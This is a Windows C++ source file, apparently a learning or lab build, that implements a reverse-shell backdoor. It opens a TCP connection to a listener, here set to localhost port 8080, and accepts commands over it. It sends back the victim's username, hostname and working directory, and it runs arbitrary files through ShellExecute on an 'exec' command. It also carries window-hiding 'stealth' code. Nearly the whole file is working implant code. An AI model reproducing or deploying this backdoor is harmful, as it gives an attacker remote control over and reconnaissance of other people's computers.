#include <winsock2.h>       //Socket Header
#include <windows.h>        //Win API Header
#include <ws2tcpip.h>       //TCP-IP Header
#include <stdio.h>          //Input Output Header

#include <iostream>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

/*
int main(){
    int x = 10, y = 2;

    std::cout << "Hello world" << std::endl;
    system("pause");
}
*/

void exec(char* returnval, int returnsize, char *fileexec)
{
    int code = (int)ShellExecute(NULL,LPCTSTR("open"),LPCTSTR(fileexec), NULL, NULL, SW_SHOW);
    std::cout << fileexec << code <<std::endl;
    if (32 > code) //Get return value in int
    {
        strcat(returnval, "[x] Error executing command..\n");
    }
    else
    {
        strcat(returnval, "\n");
    }
}

void whoami(char* returnval, int returnsize){
    DWORD bufferlen = 257;
    GetUserName(returnval,&bufferlen);
}

void hostname(char* returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetComputerName(returnval, &bufferlen);
}

void pwd(char* returnval, int returnsize) //Module 2
{
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    strcat(returnval, tempvar);
}

void RevShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(8080);
    //cout << "[+] Step 2..." << endl;
    if ((connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR)) {
        //std::cout << "[+] Step 3: Error..." << std::endl;
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        //std::cout << "[+] Connected. Hit <Enter> to disconnect..." << std::endl;
        //std::cin.get();
        char CommandReceived[DEFAULT_BUFLEN] = "";
        while (true)
        {
            int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN,0);
            if (Result > 0){
                //std::cout << "Command Received: " << CommandReceived << std::endl;
                //std::cout << "Length of Command Received: " << Result << std::endl; 
            if ((strcmp(CommandReceived,"whoami\n")) == 0){
                char buffer[257] = "";
                whoami(buffer,257);
                strcat(buffer,"\n");
                send(tcpsock,buffer,strlen(buffer)+1,0);
                memset(buffer,0,sizeof(buffer));
            } else if ((strcmp(CommandReceived,"pwd\n")) == 0){
                char buffer[257] = "";
                pwd(buffer,257);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
            } else if ((strcmp(CommandReceived, "hostname\n") == 0)) {
                char buffer[257] = "";
                hostname(buffer,257);
                strcat(buffer, "\n");
                send(tcpsock, buffer, strlen(buffer)+1, 0);
                memset(buffer, 0, sizeof(buffer));
            } else if ((strcmp(CommandReceived,"exit\n")) == 0){
                closesocket(tcpsock);
                WSACleanup();
                exit(0);
            } else {
                char splitval[DEFAULT_BUFLEN] = "";
                for(int i=0; i < ( *(&CommandReceived +1) - CommandReceived ); i++){
                    if ( CommandReceived[i] == *" "){
                        break;
                    } else {
                        splitval[i] = CommandReceived[i];
                    }
                }
                if ((strcmp(splitval, "exec") == 0)) {
                    char CommandExec[DEFAULT_BUFLEN] = "";
                    int j = 0;
                    for(int i=5; i<(*(&CommandReceived + 1) - CommandReceived); ++i)
                    {
                        CommandExec[j] = CommandReceived[i]; //store the secondary variable in the CommandExec variable
                        ++j;
                    }
                    char buffer[257] = "";
                    exec(buffer, 257, CommandExec);
                    strcat(buffer, "\n");
                    send(tcpsock, buffer, strlen(buffer)+1, 0);
                    memset(buffer, 0, sizeof(buffer));
                }       

            } 
            }
            memset(CommandReceived, 0 , sizeof(CommandReceived));
        }
        
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}
int main()
{
    //std::cout << "[+] Try to run server..." << std::endl;
    HWND stealth;           //Declare a window handle 
    AllocConsole();          //Allocate a new console
    stealth=FindWindowA("ConsoleWindowClass",NULL); //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(stealth,1);  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
    //std::cout << "[+] Step 1..." << std::endl;
    //ShellExecute(NULL,"open","1.mp3", NULL, NULL, SW_SHOW);
    RevShell();
    return 0;
}

